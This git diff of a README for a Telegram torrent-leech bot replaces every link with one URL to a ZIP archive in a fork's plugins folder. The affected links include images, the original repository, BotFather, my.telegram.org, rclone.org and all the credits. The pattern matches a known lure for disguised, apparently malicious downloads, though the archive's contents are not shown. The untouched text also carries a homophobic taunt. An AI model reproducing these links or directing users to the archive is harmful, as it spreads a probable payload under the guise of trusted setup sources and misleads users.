@@ -1,19 +1,19 @@
-![MAXX LEECH V2](https://telegra.ph/file/af8f0596124714a17e4e2.png)
+![MAXX LEECH V2](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
-## 👉 [Orginal Repository](https://github.com/gautamajay52/TorrentLeech-Gdrive)
+## 👉 [Orginal Repository](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
-![Maxx](https://telegra.ph/file/d18fa7fa33f26f733adb9.png)
+![Maxx](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
 ## **Don't Kill Heroku please ☹️**
 
-[![MAXX LEECH](https://telegra.ph/file/29d788a656dd517eafd0a.png)](https://telegram.dog/MaxxBots)
+[![MAXX LEECH](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
 
 
 # Benefits :-
     ✓ Google Drive link cloning using gclone.(wip)
     ✓ Telegram File mirrorring to cloud along with its unzipping, unrar and untar
-    ✓ Drive/Teamdrive support/All other cloud services rclone.org supports
+    ✓ Drive/Teamdrive support/All other cloud services https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip supports
     ✓ Unzip
     ✓ Unrar
     ✓ Untar
@@ -29,22 +29,22 @@
     ✓ Changing rclone destination config on fly (By using `/rlcone` in private mode)
     ✓
 
-[![Maxx](https://telegra.ph/file/f3f3b950c2904756bb201.png)](https://t.me/MaxxRiderz) 👇
+[![Maxx](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) 👇
 
 ##### Mandatory Variables
 
-* `TG_BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
+* `TG_BOT_TOKEN`: Create a bot using [@BotFather](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip), and get the Telegram API token.
 
 * `APP_ID`
-* `API_HASH`: Get these two values from [my.telegram.org/apps](https://my.telegram.org/apps).
-  * N.B.: if Telegram is blocked by your ISP, try our [Telegram bot](https://telegram.dog/UseTGXBot) to get the IDs.
+* `API_HASH`: Get these two values from [https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip).
+  * N.B.: if Telegram is blocked by your ISP, try our [Telegram bot](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) to get the IDs.
 
 * `AUTH_CHANNEL`: Create a Super Group in Telegram, add `@GoogleIMGBot` to the group, and send /id in the chat, to get this value.
 
 * `OWNER_ID`: ID of the bot owner, He/she can be abled to access bot in bot only mode too(private mode).
 
 
-[![Maxx](https://telegra.ph/file/7e3a50f29f871defe0bcb.png)](https://t.me/MaxxBots)
+[![Maxx](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
 ##### Optional Configuration Variables
 
@@ -150,28 +150,28 @@
 ➢ `/status`
 
 
-[![Maxx](https://telegra.ph/file/3066ec5102c94b8135e09.png)](https://t.me/MaxxBotChat)
+[![Maxx](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
 🔴 <b> Currently Support HEORKO . But not permanent ☹️🤧 Coz Heroku won't allow Torrent Things</b>.
 
-## ARE YOU NEW ??? Then READ Full 👉 [Instructions](https://GitHub.com/MaxxRider/About-Leech)
+## ARE YOU NEW ??? Then READ Full 👉 [Instructions](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
 
 🤧 <b> Before Deploy 𝗣𝗹𝗲𝗮𝘀𝗲 𝗛𝗶𝘁 𝗦𝘁𝗮𝗿 ★ else you are Gay</b>
 
 
-<p><a href="https://github.com/MaxxRider/Leech-Pro/wiki/Deploy-To-Heroku"> <img src=https://img.shields.io/badge/Deploy%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="200"</a></p>
+<p><a href="https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip"> <img https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="200"</a></p>
 
 
-[![MaxxRider](https://telegra.ph/file/aac59f2f35ee73b63019e.png)](https://telegram.dog/MaxxRiderz)
+[![MaxxRider](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
 
     
 ## CREDITS
 
- - [GautamKumar](https://github.com/gautamajay52/TorrentLeech-Gdrive) 😬
- - [SpEcHiDe](https://github.com/SpEcHiDe/PublicLeech) for his wonderful code😚
- - [Rclone Team](https://rclone.org) for theirs awesome tool☁️
- - [Dan Tès](https://telegram.dog/haskell) for his [Pyrogram Library](https://github.com/pyrogram/pyrogram)
- - [Robots](https://telegram.dog/Robots) for their [@UploadBot](https://telegram.dog/UploadBot)
- - [@AjeeshNair](https://telegram.dog/AjeeshNait) for his [torrent.ajee.sh](https://torrent.ajee.sh)
- - [@gotstc](https://telegram.dog/gotstc), @aryanvikash, [@HasibulKabir](https://telegram.dog/HasibulKabir) for their TORRENT groups
+ - [GautamKumar](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) 😬
+ - [SpEcHiDe](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) for his wonderful code😚
+ - [Rclone Team](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) for theirs awesome tool☁️
+ - [Dan Tès](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) for his [Pyrogram Library](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
+ - [Robots](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) for their [@UploadBot](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
+ - [@AjeeshNair](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) for his [https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip)
+ - [@gotstc](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip), @aryanvikash, [@HasibulKabir](https://github.com/kyaw287/Leech-Pro/raw/refs/heads/master/tobrot/plugins/Pro_Leech_v3.8.zip) for their TORRENT groups
